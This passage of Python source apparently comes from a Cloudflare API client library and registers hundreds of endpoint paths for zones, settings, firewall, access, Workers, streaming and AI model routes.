    zones_secondary_dns(self)
    zones_settings(self)
    zones_spectrum(self)
    zones_ssl(self)
    zones_waiting_rooms(self)
    zones_workers(self)
    zones_extras(self)
    zones_web3(self)
    zones_email(self)
    zones_api_gateway(self)

    # The API commands for /railguns/
    railguns(self)

    # The API commands for /certificates/
    certificates(self)

    # The API commands for /ips/
    ips(self)

    # The API commands for /live/
    live(self)

    # The API commands for /accounts/
    accounts(self)
    accounts_access(self)
    accounts_addressing(self)
    accounts_audit_logs(self)
    accounts_diagnostics(self)
    accounts_firewall(self)
    accounts_load_balancers(self)
    accounts_secondary_dns(self)
    accounts_stream(self)
    accounts_ai(self)
    accounts_extras(self)
    accounts_cloudforce_one(self)
    accounts_email(self)
    accounts_r2(self)

    # The API commands for /memberships/
    memberships(self)

    # The API commands for /graphql
    graphql(self)

    # Issue 151
    from_developers(self)

def user(self):
    """ :meta private: """

    self.add('AUTH', 'user')
    self.add('AUTH', 'user/billing/history')
    self.add('AUTH', 'user/billing/profile')
#   self.add('AUTH', 'user/billing/subscriptions/apps')
#   self.add('AUTH', 'user/billing/subscriptions/zones')
    self.add('AUTH', 'user/firewall/access_rules/rules')
    self.add('AUTH', 'user/invites')
    self.add('AUTH', 'user/organizations')
    self.add('AUTH', 'user/subscriptions')

def zones(self):
    """ :meta private: """

    self.add('AUTH', 'zones')
    self.add('AUTH', 'zones', 'activation_check')
    self.add('AUTH', 'zones', 'available_plans')
    self.add('AUTH', 'zones', 'available_rate_plans')
    self.add('AUTH', 'zones', 'bot_management')
    self.add('AUTH', 'zones', 'bot_management/feedback')
    self.add('AUTH', 'zones', 'client_certificates')
    self.add('AUTH', 'zones', 'custom_certificates')
    self.add('AUTH', 'zones', 'custom_certificates/prioritize')
    self.add('AUTH', 'zones', 'custom_csrs')
    self.add('AUTH', 'zones', 'custom_hostnames')
    self.add('AUTH', 'zones', 'custom_hostnames/fallback_origin')
    self.add('AUTH', 'zones', 'custom_ns')
    self.add('AUTH', 'zones', 'custom_pages')
    self.add('AUTH', 'zones', 'dns_records')
    self.add('AUTH', 'zones', 'dns_records/export')
    self.add('AUTH', 'zones', 'dns_records/import', content_type={'POST':'multipart/form-data'})
    self.add('AUTH', 'zones', 'dns_records/scan')
    self.add('AUTH', 'zones', 'dns_settings')
    self.add('AUTH', 'zones', 'dns_settings/use_apex_ns')
    self.add('AUTH', 'zones', 'filters')
    self.add('AUTH', 'zones', 'filters/validate-expr')
    self.add('AUTH', 'zones', 'healthchecks')
    self.add('AUTH', 'zones', 'healthchecks/preview')
    self.add('AUTH', 'zones', 'keyless_certificates')
    self.add('AUTH', 'zones', 'origin_max_http_version')
    self.add('AUTH', 'zones', 'pagerules')
    self.add('AUTH', 'zones', 'pagerules/settings')
    self.add('AUTH', 'zones', 'purge_cache')
    self.add('AUTH', 'zones', 'railguns')
    self.add('AUTH', 'zones', 'railguns', 'diagnose')
    self.add('AUTH', 'zones', 'security/events')
    self.add('AUTH', 'zones', 'subscription')

def zones_settings(self):
    """ :meta private: """

    self.add('AUTH', 'zones', 'settings')
    self.add('AUTH', 'zones', 'settings/0rtt')
    self.add('AUTH', 'zones', 'settings/advanced_ddos')
    self.add('AUTH', 'zones', 'settings/always_online')
    self.add('AUTH', 'zones', 'settings/always_use_https')
    self.add('AUTH', 'zones', 'settings/automatic_https_rewrites')
    self.add('AUTH', 'zones', 'settings/automatic_platform_optimization')
    self.add('AUTH', 'zones', 'settings/brotli')
    self.add('AUTH', 'zones', 'settings/browser_cache_ttl')
    self.add('AUTH', 'zones', 'settings/browser_check')
    self.add('AUTH', 'zones', 'settings/cache_level')
    self.add('AUTH', 'zones', 'settings/challenge_ttl')
    self.add('AUTH', 'zones', 'settings/ciphers')
    self.add('AUTH', 'zones', 'settings/development_mode')
    self.add('AUTH', 'zones', 'settings/early_hints')
    self.add('AUTH', 'zones', 'settings/email_obfuscation')
    self.add('AUTH', 'zones', 'settings/fonts')
    self.add('AUTH', 'zones', 'settings/h2_prioritization')
    self.add('AUTH', 'zones', 'settings/hotlink_protection')
    self.add('AUTH', 'zones', 'settings/http2')
    self.add('AUTH', 'zones', 'settings/http3')
    self.add('AUTH', 'zones', 'settings/image_resizing')
    self.add('AUTH', 'zones', 'settings/ip_geolocation')
    self.add('AUTH', 'zones', 'settings/ipv6')
    self.add('AUTH', 'zones', 'settings/min_tls_version')
    self.add('AUTH', 'zones', 'settings/minify')
    self.add('AUTH', 'zones', 'settings/mirage')
    self.add('AUTH', 'zones', 'settings/mobile_redirect')
    self.add('AUTH', 'zones', 'settings/nel')
    self.add('AUTH', 'zones', 'settings/opportunistic_encryption')
    self.add('AUTH', 'zones', 'settings/opportunistic_onion')
    self.add('AUTH', 'zones', 'settings/orange_to_orange')
    self.add('AUTH', 'zones', 'settings/origin_error_page_pass_thru')
    self.add('AUTH', 'zones', 'settings/origin_max_http_version')
    self.add('AUTH', 'zones', 'settings/polish')
    self.add('AUTH', 'zones', 'settings/prefetch_preload')
    self.add('AUTH', 'zones', 'settings/privacy_pass')
    self.add('AUTH', 'zones', 'settings/proxy_read_timeout')
    self.add('AUTH', 'zones', 'settings/pseudo_ipv4')
    self.add('AUTH', 'zones', 'settings/response_buffering')
    self.add('AUTH', 'zones', 'settings/rocket_loader')
    self.add('AUTH', 'zones', 'settings/security_header')
    self.add('AUTH', 'zones', 'settings/security_level')
    self.add('AUTH', 'zones', 'settings/server_side_exclude')
    self.add('AUTH', 'zones', 'settings/sort_query_string_for_cache')
    self.add('AUTH', 'zones', 'settings/ssl')
    self.add('AUTH', 'zones', 'settings/ssl_recommender')
    self.add('AUTH', 'zones', 'settings/tls_1_3')
    self.add('AUTH', 'zones', 'settings/tls_client_auth')
    self.add('AUTH', 'zones', 'settings/true_client_ip_header')
    self.add('AUTH', 'zones', 'settings/waf')
    self.add('AUTH', 'zones', 'settings/webp')
    self.add('AUTH', 'zones', 'settings/websockets')

    self.add('AUTH', 'zones', 'settings/zaraz/config')
    self.add('AUTH', 'zones', 'settings/zaraz/default')
    self.add('AUTH', 'zones', 'settings/zaraz/export')
    self.add('AUTH', 'zones', 'settings/zaraz/history')
    self.add('AUTH', 'zones', 'settings/zaraz/history/configs')
    self.add('AUTH', 'zones', 'settings/zaraz/publish')
    self.add('AUTH', 'zones', 'settings/zaraz/workflow')

    self.add('AUTH', 'zones', 'settings/zaraz/v2/config')
    self.add('AUTH', 'zones', 'settings/zaraz/v2/default')
    self.add('AUTH', 'zones', 'settings/zaraz/v2/export')
    self.add('AUTH', 'zones', 'settings/zaraz/v2/history')
    self.add('AUTH', 'zones', 'settings/zaraz/v2/history/configs')
    self.add('AUTH', 'zones', 'settings/zaraz/v2/publish')
    self.add('AUTH', 'zones', 'settings/zaraz/v2/workflow')

def zones_analytics(self):
    """ :meta private: """

#   self.add('AUTH', 'zones', 'analytics/colos') # deprecated 2021-03-01 - expired!
#   self.add('AUTH', 'zones', 'analytics/dashboard') # deprecated 2021-03-01 - expired!
    self.add('AUTH', 'zones', 'analytics/latency')
    self.add('AUTH', 'zones', 'analytics/latency/colos')

def zones_firewall(self):
    """ :meta private: """

    self.add('AUTH', 'zones', 'firewall/access_rules/rules')
    self.add('AUTH', 'zones', 'firewall/lockdowns')
    self.add('AUTH', 'zones', 'firewall/rules')
    self.add('AUTH', 'zones', 'firewall/ua_rules')
    self.add('AUTH', 'zones', 'firewall/waf/overrides')
    self.add('AUTH', 'zones', 'firewall/waf/packages')
    self.add('AUTH', 'zones', 'firewall/waf/packages', 'groups')
    self.add('AUTH', 'zones', 'firewall/waf/packages', 'rules')

def zones_rate_limits(self):
    """ :meta private: """

    self.add('AUTH', 'zones', 'rate_limits')

def zones_dns_analytics(self):
    """ :meta private: """

    self.add('AUTH', 'zones', 'dns_analytics/report')
    self.add('AUTH', 'zones', 'dns_analytics/report/bytime')

def zones_amp(self):
    """ :meta private: """

    self.add('AUTH', 'zones', 'amp/sxg')

def zones_logpush(self):
    """ :meta private: """

    self.add('AUTH', 'zones', 'logpush/datasets', 'fields')
    self.add('AUTH', 'zones', 'logpush/datasets', 'jobs')
    self.add('AUTH', 'zones', 'logpush/edge')
    self.add('AUTH', 'zones', 'logpush/edge/jobs')
    self.add('AUTH', 'zones', 'logpush/jobs')
    self.add('AUTH', 'zones', 'logpush/ownership')
    self.add('AUTH', 'zones', 'logpush/ownership/validate')
    self.add('AUTH', 'zones', 'logpush/validate/destination/exists')
    self.add('AUTH', 'zones', 'logpush/validate/origin')

def zones_logs(self):
    """ :meta private: """

    self.add('AUTH', 'zones', 'logs/control/retention/flag')
    self.add('AUTH_UNWRAPPED', 'zones', 'logs/received')
    self.add('AUTH', 'zones', 'logs/received/fields')
    self.add('AUTH_UNWRAPPED', 'zones', 'logs/rayids')

def railguns(self):
    """ :meta private: """

    self.add('AUTH', 'railguns')
    self.add('AUTH', 'railguns', 'zones')

def certificates(self):
    """ :meta private: """

    self.add('CERT', 'certificates')

def ips(self):
    """ :meta private: """

    self.add('OPEN', 'ips')

def live(self):
    """ :meta private: """

    self.add('AUTH', 'live')

def zones_argo(self):
    """ :meta private: """

    self.add('AUTH', 'zones', 'argo/tiered_caching')
    self.add('AUTH', 'zones', 'argo/smart_routing')

def zones_dnssec(self):
    """ :meta private: """

    self.add('AUTH', 'zones', 'dnssec')

def zones_spectrum(self):
    """ :meta private: """

    self.add('AUTH', 'zones', 'spectrum/analytics/aggregate/current')
    self.add('AUTH', 'zones', 'spectrum/analytics/events/bytime')
    self.add('AUTH', 'zones', 'spectrum/analytics/events/summary')
    self.add('AUTH', 'zones', 'spectrum/apps')

def zones_ssl(self):
    """ :meta private: """

    self.add('AUTH', 'zones', 'ssl/analyze')
    self.add('AUTH', 'zones', 'ssl/certificate_packs')
    self.add('AUTH', 'zones', 'ssl/certificate_packs/order')
    self.add('AUTH', 'zones', 'ssl/certificate_packs/quota')
    self.add('AUTH', 'zones', 'ssl/recommendation')
    self.add('AUTH', 'zones', 'ssl/verification')
    self.add('AUTH', 'zones', 'ssl/universal/settings')

def zones_origin_tls_client_auth(self):
    """ :meta private: """

    self.add('AUTH', 'zones', 'origin_tls_client_auth')
    self.add('AUTH', 'zones', 'origin_tls_client_auth/hostnames')
    self.add('AUTH', 'zones', 'origin_tls_client_auth/hostnames/certificates')
    self.add('AUTH', 'zones', 'origin_tls_client_auth/settings')

def zones_workers(self):
    """ :meta private: """

    self.add('AUTH', 'zones', 'workers/filters')
    self.add('AUTH', 'zones', 'workers/routes')
    self.add('AUTH', 'zones', 'workers/script')
    self.add('AUTH', 'zones', 'workers/script/bindings')

def zones_load_balancers(self):
    """ :meta private: """

    self.add('AUTH', 'zones', 'load_balancers')

def zones_secondary_dns(self):
    """ :meta private: """

    self.add('AUTH', 'zones', 'secondary_dns')
    self.add('AUTH', 'zones', 'secondary_dns/force_axfr')
    self.add('AUTH', 'zones', 'secondary_dns/incoming')
    self.add('AUTH', 'zones', 'secondary_dns/outgoing')
    self.add('AUTH', 'zones', 'secondary_dns/outgoing/disable')
    self.add('AUTH', 'zones', 'secondary_dns/outgoing/enable')
    self.add('AUTH', 'zones', 'secondary_dns/outgoing/force_notify')
    self.add('AUTH', 'zones', 'secondary_dns/outgoing/status')

def user_load_balancers(self):
    """ :meta private: """

    self.add('AUTH', 'user/load_balancers/monitors')
    self.add('AUTH', 'user/load_balancers/monitors', 'preview')
    self.add('AUTH', 'user/load_balancers/monitors', 'references')
    self.add('AUTH', 'user/load_balancers/preview')
    self.add('AUTH', 'user/load_balancers/pools')
    self.add('AUTH', 'user/load_balancers/pools', 'health')
    self.add('AUTH', 'user/load_balancers/pools', 'preview')
    self.add('AUTH', 'user/load_balancers/pools', 'references')

def user_audit_logs(self):
    """ :meta private: """

    self.add('AUTH', 'user/audit_logs')

def user_load_balancing_analytics(self):
    """ :meta private: """

    self.add('AUTH', 'user/load_balancing_analytics/events')

def user_tokens_verify(self):
    """ :meta private: """

    self.add('AUTH', 'user/tokens')
    self.add('AUTH', 'user/tokens/permission_groups')
    self.add('AUTH', 'user/tokens/verify')
    self.add('AUTH', 'user/tokens', 'value')

def accounts(self):
    """ :meta private: """

    self.add('AUTH', 'accounts')
    self.add('AUTH', 'accounts', 'billing/profile')
    self.add('AUTH', 'accounts', 'brand-protection/submit')
    self.add('AUTH', 'accounts', 'brand-protection/url-info')
    self.add('AUTH', 'accounts', 'cfd_tunnel')
    self.add('AUTH', 'accounts', 'cfd_tunnel', 'configurations')
    self.add('AUTH', 'accounts', 'cfd_tunnel', 'connectors')
    self.add('AUTH', 'accounts', 'cfd_tunnel', 'connections')
    self.add('AUTH', 'accounts', 'cfd_tunnel', 'management')
    self.add('AUTH', 'accounts', 'cfd_tunnel', 'token')
    self.add('AUTH', 'accounts', 'custom_pages')

    self.add('AUTH', 'accounts', 'dlp/datasets')
    self.add('AUTH', 'accounts', 'dlp/datasets', 'upload', content_type={'POST':'application/octet-stream'})
    self.add('AUTH', 'accounts', 'dlp/patterns/validate')
    self.add('AUTH', 'accounts', 'dlp/payload_log')
    self.add('AUTH', 'accounts', 'dlp/profiles')
    self.add('AUTH', 'accounts', 'dlp/profiles/custom')
    self.add('AUTH', 'accounts', 'dlp/profiles/predefined')

    self.add('AUTH', 'accounts', 'members')
    self.add('AUTH', 'accounts', 'mnm/config')
    self.add('AUTH', 'accounts', 'mnm/config/full')
    self.add('AUTH', 'accounts', 'mnm/rules')
    self.add('AUTH', 'accounts', 'mnm/rules', 'advertisement')
    self.add('AUTH', 'accounts', 'railguns')
    self.add('AUTH', 'accounts', 'railguns', 'connections')
    self.add('AUTH', 'accounts', 'registrar/domains')
    self.add('AUTH', 'accounts', 'registrar/contacts')
    self.add('AUTH', 'accounts', 'roles')
    self.add('AUTH', 'accounts', 'rules/lists')
    self.add('AUTH', 'accounts', 'rules/lists', 'items')
    self.add('AUTH', 'accounts', 'rules/lists/bulk_operations')
    self.add('AUTH', 'accounts', 'rulesets')
    self.add('AUTH', 'accounts', 'rulesets', 'versions')
    self.add('AUTH', 'accounts', 'rulesets', 'versions', 'by_tag')
    self.add('AUTH', 'accounts', 'rulesets', 'versions', 'by_tag/wordpress')
    self.add('AUTH', 'accounts', 'rulesets', 'rules')
#   self.add('AUTH', 'accounts', 'rulesets/import')
    self.add('AUTH', 'accounts', 'rulesets/phases', 'entrypoint')
    self.add('AUTH', 'accounts', 'rulesets/phases', 'entrypoint/versions')
    self.add('AUTH', 'accounts', 'rulesets/phases', 'versions')

    self.add('AUTH', 'accounts', 'rum/site_info')
    self.add('AUTH', 'accounts', 'rum/site_info/list')
    self.add('AUTH', 'accounts', 'rum/v2', 'rule')
    self.add('AUTH', 'accounts', 'rum/v2', 'rules')

    self.add('AUTH', 'accounts', 'storage/analytics')
    self.add('AUTH', 'accounts', 'storage/analytics/stored')
    self.add('AUTH', 'accounts', 'storage/kv/namespaces')
    self.add('AUTH', 'accounts', 'storage/kv/namespaces', 'bulk')
    self.add('AUTH', 'accounts', 'storage/kv/namespaces', 'keys')
    self.add('AUTH', 'accounts', 'storage/kv/namespaces', 'values', content_type={'PUT':'multipart/form-data'})
    self.add('AUTH', 'accounts', 'storage/kv/namespaces', 'metadata')

    self.add('AUTH', 'accounts', 'subscriptions')
    self.add('AUTH', 'accounts', 'tunnels')
    self.add('AUTH', 'accounts', 'tunnels', 'connections')

    self.add('AUTH', 'accounts', 'vectorize/index')
    self.add('AUTH', 'accounts', 'vectorize/indexes')
    self.add('AUTH', 'accounts', 'vectorize/indexes', 'delete-by-ids')
    self.add('AUTH', 'accounts', 'vectorize/indexes', 'get-by-ids')
    self.add('AUTH', 'accounts', 'vectorize/indexes', 'insert', content_type={'POST':'application/x-ndjson'})
    self.add('AUTH', 'accounts', 'vectorize/indexes', 'query')
    self.add('AUTH', 'accounts', 'vectorize/indexes', 'upsert', content_type={'POST':'application/x-ndjson'})

    self.add('AUTH', 'accounts', 'virtual_dns')
    self.add('AUTH', 'accounts', 'virtual_dns', 'dns_analytics/report')
    self.add('AUTH', 'accounts', 'virtual_dns', 'dns_analytics/report/bytime')

    self.add('AUTH', 'accounts', 'workers/account-settings')
    self.add('AUTH', 'accounts', 'workers/deployments/by-script')
    self.add('AUTH', 'accounts', 'workers/deployments/by-script', 'detail')
    self.add('AUTH', 'accounts', 'workers/dispatch/namespaces')
    self.add('AUTH', 'accounts', 'workers/dispatch/namespaces', 'scripts')
    self.add('AUTH', 'accounts', 'workers/dispatch/namespaces', 'scripts', 'bindings')
    self.add('AUTH', 'accounts', 'workers/dispatch/namespaces', 'scripts', 'content', content_type={'PUT':'multipart/form-data'})
    self.add('AUTH', 'accounts', 'workers/dispatch/namespaces', 'scripts', 'secrets')
    self.add('AUTH', 'accounts', 'workers/dispatch/namespaces', 'scripts', 'settings')
    self.add('AUTH', 'accounts', 'workers/dispatch/namespaces', 'scripts', 'tags')
    self.add('AUTH', 'accounts', 'workers/domains')
    self.add('AUTH', 'accounts', 'workers/durable_objects/namespaces')
    self.add('AUTH', 'accounts', 'workers/durable_objects/namespaces', 'objects')
    self.add('AUTH', 'accounts', 'workers/queues')
    self.add('AUTH', 'accounts', 'workers/queues', 'consumers')
    self.add('AUTH', 'accounts', 'workers/scripts')
    self.add('AUTH', 'accounts', 'workers/scripts', 'content', content_type={'PUT':'multipart/form-data'})
    self.add('AUTH', 'accounts', 'workers/scripts', 'content/v2')
    self.add('AUTH', 'accounts', 'workers/scripts', 'deployments')
    self.add('AUTH', 'accounts', 'workers/scripts', 'schedules')
    self.add('AUTH', 'accounts', 'workers/scripts', 'script-settings')
    self.add('AUTH', 'accounts', 'workers/scripts', 'settings', content_type={'PATCH':'multipart/form-data'})
    self.add('AUTH', 'accounts', 'workers/scripts', 'tails')
    self.add('AUTH', 'accounts', 'workers/scripts', 'usage-model')
    self.add('AUTH', 'accounts', 'workers/scripts', 'versions')
    self.add('AUTH', 'accounts', 'workers/services', 'environments', 'content', content_type={'PUT':'multipart/form-data'})
    self.add('AUTH', 'accounts', 'workers/services', 'environments', 'settings')

    self.add('AUTH', 'accounts', 'workers/subdomain')

def accounts_addressing(self):
    """ :meta private: """

    self.add('AUTH', 'accounts', 'addressing/address_maps')
    self.add('AUTH', 'accounts', 'addressing/address_maps', 'accounts')
    self.add('AUTH', 'accounts', 'addressing/address_maps', 'ips')
    self.add('AUTH', 'accounts', 'addressing/address_maps', 'zones')
    self.add('AUTH', 'accounts', 'addressing/loa_documents', content_type={'POST':'multipart/form-data'})
    self.add('AUTH', 'accounts', 'addressing/loa_documents', 'download')
    self.add('AUTH', 'accounts', 'addressing/prefixes')
    self.add('AUTH', 'accounts', 'addressing/prefixes', 'bgp/prefixes')
    self.add('AUTH', 'accounts', 'addressing/prefixes', 'bgp/status')
    self.add('AUTH', 'accounts', 'addressing/prefixes', 'bindings')
    self.add('AUTH', 'accounts', 'addressing/prefixes', 'delegations')
    self.add('AUTH', 'accounts', 'addressing/services')

def accounts_audit_logs(self):
    """ :meta private: """

    self.add('AUTH', 'accounts', 'audit_logs')

def accounts_load_balancers(self):
    """ :meta private: """

    self.add('AUTH', 'accounts', 'load_balancers/preview')
    self.add('AUTH', 'accounts', 'load_balancers/monitors')
    self.add('AUTH', 'accounts', 'load_balancers/monitors', 'preview')
    self.add('AUTH', 'accounts', 'load_balancers/monitors', 'references')
    self.add('AUTH', 'accounts', 'load_balancers/pools')
    self.add('AUTH', 'accounts', 'load_balancers/pools', 'health')
    self.add('AUTH', 'accounts', 'load_balancers/pools', 'preview')
    self.add('AUTH', 'accounts', 'load_balancers/pools', 'references')
    self.add('AUTH', 'accounts', 'load_balancers/regions')
    self.add('AUTH', 'accounts', 'load_balancers/search')


def accounts_firewall(self):
    """ :meta private: """

    self.add('AUTH', 'accounts', 'firewall/access_rules/rules')

def accounts_secondary_dns(self):
    """ :meta private: """

#   self.add('AUTH', 'accounts', 'secondary_dns/masters')
    self.add('AUTH', 'accounts', 'secondary_dns/primaries')
    self.add('AUTH', 'accounts', 'secondary_dns/tsigs')
    self.add('AUTH', 'accounts', 'secondary_dns/acls')
    self.add('AUTH', 'accounts', 'secondary_dns/peers')

def accounts_stream(self):
    """ :meta private: """

    self.add('AUTH', 'accounts', 'stream')
    self.add('AUTH', 'accounts', 'stream', 'audio')
    self.add('AUTH', 'accounts', 'stream', 'audio/copy')
    self.add('AUTH', 'accounts', 'stream', 'captions', content_type={'PUT':'multipart/form-data'})
    self.add('AUTH', 'accounts', 'stream', 'embed')
    self.add('AUTH', 'accounts', 'stream', 'downloads')
    self.add('AUTH', 'accounts', 'stream', 'token')
    self.add('AUTH', 'accounts', 'stream/clip')
    self.add('AUTH', 'accounts', 'stream/copy')
    self.add('AUTH', 'accounts', 'stream/direct_upload')
    self.add('AUTH', 'accounts', 'stream/keys')
#   self.add('AUTH', 'accounts', 'stream/preview')
    self.add('AUTH', 'accounts', 'stream/watermarks', content_type={'POST':'multipart/form-data'})
    self.add('AUTH', 'accounts', 'stream/webhook')
    self.add('AUTH', 'accounts', 'stream/live_inputs')
    self.add('AUTH', 'accounts', 'stream/live_inputs', 'outputs')
    self.add('AUTH', 'accounts', 'stream/live_inputs', 'outputs', 'enabled')

def zones_media(self):
    """ :meta private: """

    self.add('AUTH', 'zones', 'media')
    self.add('AUTH', 'zones', 'media', 'embed')
    self.add('AUTH', 'zones', 'media', 'preview')

def memberships(self):
    """ :meta private: """

    self.add('AUTH', 'memberships')

def graphql(self):
    """ :meta private: """

    self.add('AUTH', 'graphql')

def zones_access(self):
    """ :meta private: """

    self.add('AUTH', 'zones', 'access/apps')
    self.add('AUTH', 'zones', 'access/apps', 'policies')
    self.add('AUTH', 'zones', 'access/apps', 'revoke_tokens')
    self.add('AUTH', 'zones', 'access/bookmarks')
    self.add('AUTH', 'zones', 'access/certificates')
    self.add('AUTH', 'zones', 'access/certificates/settings')
#   self.add('AUTH', 'zones', 'access/apps/ca')
    self.add('AUTH', 'zones', 'access/apps', 'ca')
    self.add('AUTH', 'zones', 'access/apps', 'user_policy_checks')
    self.add('AUTH', 'zones', 'access/groups')
    self.add('AUTH', 'zones', 'access/identity_providers')
    self.add('AUTH', 'zones', 'access/organizations')
    self.add('AUTH', 'zones', 'access/organizations/revoke_user')
    self.add('AUTH', 'zones', 'access/service_tokens')

def accounts_access(self):
    """ :meta private: """

#   self.add('AUTH', 'accounts', 'access/bookmarks') # deprecated 2023-03-19
    self.add('AUTH', 'accounts', 'access/custom_pages')
    self.add('AUTH', 'accounts', 'access/gateway_ca')
    self.add('AUTH', 'accounts', 'access/groups')
    self.add('AUTH', 'accounts', 'access/identity_providers')
    self.add('AUTH', 'accounts', 'access/organizations')
#   self.add('AUTH', 'accounts', 'access/organizations/doh') # deprecated 2020-02-04 - expired!
    self.add('AUTH', 'accounts', 'access/organizations/revoke_user')
    self.add('AUTH', 'accounts', 'access/service_tokens')
    self.add('AUTH', 'accounts', 'access/service_tokens', 'refresh')
    self.add('AUTH', 'accounts', 'access/service_tokens', 'rotate')
    self.add('AUTH', 'accounts', 'access/apps')
#   self.add('AUTH', 'accounts', 'access/apps/ca')
    self.add('AUTH', 'accounts', 'access/apps', 'ca')
    self.add('AUTH', 'accounts', 'access/apps', 'policies')
    self.add('AUTH', 'accounts', 'access/apps', 'revoke_tokens')
    self.add('AUTH', 'accounts', 'access/apps', 'user_policy_checks')
    self.add('AUTH', 'accounts', 'access/certificates')
    self.add('AUTH', 'accounts', 'access/certificates/settings')
    self.add('AUTH', 'accounts', 'access/keys')
    self.add('AUTH', 'accounts', 'access/keys/rotate')
    self.add('AUTH', 'accounts', 'access/logs/access_requests')
    self.add('AUTH', 'accounts', 'access/policies')
    self.add('AUTH', 'accounts', 'access/seats')
    self.add('AUTH', 'accounts', 'access/tags')
    self.add('AUTH', 'accounts', 'access/users')
    self.add('AUTH', 'accounts', 'access/users', 'failed_logins')
    self.add('AUTH', 'accounts', 'access/users', 'active_sessions')
    self.add('AUTH', 'accounts', 'access/users', 'last_seen_identity')


def accounts_diagnostics(self):
    """ :meta private: """

    self.add('AUTH', 'accounts', 'diagnostics/traceroute')

def zones_waiting_rooms(self):
    """ :meta private: """

    self.add('AUTH', 'zones', 'waiting_rooms')
    self.add('AUTH', 'zones', 'waiting_rooms', 'events')
    self.add('AUTH', 'zones', 'waiting_rooms', 'events', 'details')
    self.add('AUTH', 'zones', 'waiting_rooms', 'rules')
    self.add('AUTH', 'zones', 'waiting_rooms', 'status')
    self.add('AUTH', 'zones', 'waiting_rooms/preview')
    self.add('AUTH', 'zones', 'waiting_rooms/settings')

def accounts_ai(self):
    """ :meta private: """

    self.add('AUTH', 'accounts', 'ai-gateway/gateways')
    self.add('AUTH', 'accounts', 'ai-gateway/gateways', 'logs')

    self.add('AUTH', 'accounts', 'ai/authors/search')
    self.add('AUTH', 'accounts', 'ai/finetunes')
    self.add('AUTH', 'accounts', 'ai/finetunes', 'finetune-assets', content_type={'POST':'multipart/form-data'})
    self.add('AUTH', 'accounts', 'ai/finetunes/public')
    self.add('AUTH', 'accounts', 'ai/models/search')

    self.add('AUTH', 'accounts', 'ai/run', content_type={'POST':['application/json','application/octet-stream']})

    self.add('AUTH', 'accounts', 'ai/run/@cf/baai/bge-base-en-v1.5')
    self.add('AUTH', 'accounts', 'ai/run/@cf/baai/bge-large-en-v1.5')
    self.add('AUTH', 'accounts', 'ai/run/@cf/baai/bge-small-en-v1.5')
    self.add('AUTH', 'accounts', 'ai/run/@cf/bytedance/stable-diffusion-xl-lightning')
    self.add('AUTH', 'accounts', 'ai/run/@cf/deepseek-ai/deepseek-coder-7b-instruct-v1.5')
    self.add('AUTH', 'accounts', 'ai/run/@cf/deepseek-ai/deepseek-math-7b-base')
    self.add('AUTH', 'accounts', 'ai/run/@cf/deepseek-ai/deepseek-math-7b-instruct')
    self.add('AUTH', 'accounts', 'ai/run/@cf/defog/sqlcoder-7b-2')
    self.add('AUTH', 'accounts', 'ai/run/@cf/facebook/bart-large-cnn')
    self.add('AUTH', 'accounts', 'ai/run/@cf/facebook/detr-resnet-50', content_type={'POST':'application/octet-stream'})
    self.add('AUTH', 'accounts', 'ai/run/@cf/fblgit/una-cybertron-7b-v2-bf16')
    self.add('AUTH', 'accounts', 'ai/run/@cf/google/gemma-2b-it-lora')
    self.add('AUTH', 'accounts', 'ai/run/@cf/google/gemma-7b-it-lora')
    self.add('AUTH', 'accounts', 'ai/run/@cf/huggingface/distilbert-sst-2-int8')
    self.add('AUTH', 'accounts', 'ai/run/@cf/inml/inml-roberta-dga')
    self.add('AUTH', 'accounts', 'ai/run/@cf/jpmorganchase/roberta-spam')
    self.add('AUTH', 'accounts', 'ai/run/@cf/llava-hf/llava-1.5-7b-hf')
    self.add('AUTH', 'accounts', 'ai/run/@cf/lykon/dreamshaper-8-lcm')
    self.add('AUTH', 'accounts', 'ai/run/@cf/m-a-p/opencodeinterpreter-ds-6.7b')
    self.add('AUTH', 'accounts', 'ai/run/@cf/meta-llama/llama-2-7b-chat-hf-lora')
    self.add('AUTH', 'accounts', 'ai/run/@cf/meta/detr-resnet-50')
    self.add('AUTH', 'accounts', 'ai/run/@cf/meta/llama-2-7b-chat-fp16')
    self.add('AUTH', 'accounts', 'ai/run/@cf/meta/llama-2-7b-chat-int8')
    self.add('AUTH', 'accounts', 'ai/run/@cf/meta/llama-3-8b-instruct')
    self.add('AUTH', 'accounts', 'ai/run/@cf/meta/m2m100-1.2b')
    self.add('AUTH', 'accounts', 'ai/run/@cf/microsoft/phi-2')
    self.add('AUTH', 'accounts', 'ai/run/@cf/microsoft/phi-3-mini-4k-instruct')
    self.add('AUTH', 'accounts', 'ai/run/@cf/microsoft/resnet-50', content_type={'POST':'application/octet-stream'})
    self.add('AUTH', 'accounts', 'ai/run/@cf/mistral/mistral-7b-instruct-v0.1')
    self.add('AUTH', 'accounts', 'ai/run/@cf/mistral/mistral-7b-instruct-v0.1-vllm')
    self.add('AUTH', 'accounts', 'ai/run/@cf/mistral/mistral-7b-instruct-v0.2-lora')
    self.add('AUTH', 'accounts', 'ai/run/@cf/mistral/mixtral-8x7b-instruct-v0.1-awq')
    self.add('AUTH', 'accounts', 'ai/run/@cf/nexaaidev/octopus-v2')
    self.add('AUTH', 'accounts', 'ai/run/@cf/openai/whisper', content_type={'POST':'application/octet-stream'})
    self.add('AUTH', 'accounts', 'ai/run/@cf/openai/whisper-sherpa', content_type={'POST':'application/octet-stream'})
    self.add('AUTH', 'accounts', 'ai/run/@cf/openai/whisper-tiny-en', content_type={'POST':'application/octet-stream'})
    self.add('AUTH', 'accounts', 'ai/run/@cf/openchat/openchat-3.5-0106')
    self.add('AUTH', 'accounts', 'ai/run/@cf/qwen/qwen1.5-0.5b-chat')
    self.add('AUTH', 'accounts', 'ai/run/@cf/qwen/qwen1.5-1.8b-chat')
    self.add('AUTH', 'accounts', 'ai/run/@cf/qwen/qwen1.5-14b-chat-awq')
    self.add('AUTH', 'accounts', 'ai/run/@cf/qwen/qwen1.5-7b-chat-awq')
    self.add('AUTH', 'accounts', 'ai/run/@cf/runwayml/stable-diffusion-v1-5-img2img')
    self.add('AUTH', 'accounts', 'ai/run/@cf/runwayml/stable-diffusion-v1-5-inpainting')
    self.add('AUTH', 'accounts', 'ai/run/@cf/stabilityai/stable-diffusion-xl-base-1.0')
    self.add('AUTH', 'accounts', 'ai/run/@cf/stabilityai/stable-diffusion-xl-turbo')
    self.add('AUTH', 'accounts', 'ai/run/@cf/sven/test')
    self.add('AUTH', 'accounts', 'ai/run/@cf/thebloke/discolm-german-7b-v1-awq')
    self.add('AUTH', 'accounts', 'ai/run/@cf/thebloke/yarn-mistral-7b-64k-awq')
    self.add('AUTH', 'accounts', 'ai/run/@cf/tiiuae/falcon-7b-instruct')
